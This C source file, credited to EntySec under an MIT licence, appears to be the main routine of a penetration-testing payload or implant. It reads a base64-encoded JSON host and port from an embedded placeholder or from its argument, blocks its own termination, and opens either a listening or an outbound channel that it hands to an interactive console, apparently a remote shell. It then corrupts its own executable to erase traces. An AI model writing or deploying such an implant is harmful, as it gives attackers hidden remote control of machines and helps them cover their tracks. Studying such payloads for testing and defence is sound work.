/*
* MIT License
*
* Copyright (c) 2020-2022 EntySec
*
* Permission is hereby granted, free of charge, to any person obtaining a copy
* of this software and associated documentation files (the "Software"), to deal
* in the Software without restriction, including without limitation the rights
* to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
* copies of the Software, and to permit persons to whom the Software is
* furnished to do so, subject to the following conditions:
*
* The above copyright notice and this permission notice shall be included in all
* copies or substantial portions of the Software.
*
* THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
* IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
* FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
* AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
* LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
* OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
* SOFTWARE.
*/

#define _GNU_SOURCE

#include <string.h>
#include <stdio.h>
#include <stdlib.h>

#include "json.h"
#include "utils.h"
#include "base64.h"

#include "channel.h"
#include "console.h"

char data[64] = ":data:string:";

int main(int argc, char *argv[])
{
    char *input;
    prevent_termination();

    if (argc < 2)
        input = decode_base64(data);
    else
        input = decode_base64(argv[1]);

    JSONObject *json = parseJSON(input);

    char *host = find_json(json, "host");
    char *port = find_json(json, "port");

    int channel;

    if (strcmp(host, "") == 0)
        channel = listen_channel(atoi(port));
    else
        channel = open_channel(host, atoi(port));

    if (channel >= 0)
        interact(channel);

    close_channel(channel);

    freeJSONFromMemory(json);
    self_corrupt(argv[0]);

    return 0;
}
